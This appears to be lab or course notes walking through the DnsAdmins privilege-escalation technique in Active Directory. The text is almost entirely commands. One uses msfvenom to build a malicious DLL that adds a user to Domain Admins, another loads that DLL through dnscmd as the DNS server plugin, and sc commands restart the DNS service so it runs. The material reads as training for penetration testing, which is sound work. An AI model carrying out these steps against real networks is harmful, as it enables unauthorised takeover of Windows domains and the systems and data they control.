#### Confirming Group Membership


```
net group "Domain Admins" /dom
```

#### Generating Malicious DLL

We can generate a malicious DLL to add a user to the `domain admins` group using `msfvenom`.

```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

### Loading DLL as Member of DnsAdmins

```
Get-ADGroupMember -Identity DnsAdmins
```

#### Loading Custom DLL

After confirming group membership in the `DnsAdmins` group, we can re-run the command to load a custom DLL.

```
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

Note: We must specify the full path to our custom DLL or the attack will not work properly.

Only the `dnscmd` utility can be used by members of the `DnsAdmins` group, as they do not directly have permission on the registry key.

After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.

### Finding User's SID

First, we need our user's SID.

```
wmic useraccount where name="netadm" get sid
```

### Checking Permissions on DNS Service

Once we have the user's SID, we can use the `sc` command to check permissions on the service. 

```
sc.exe sdshow DNS
```

#### Stopping the DNS Service

```
sc.exe stop dns
```

#### Starting the DNS Service

```
sc.exe start dns
```

## Once our user is member of domain admins , we have to ->

```
runas /user:INLANEFREIGHT\netadm cmd.exe
```

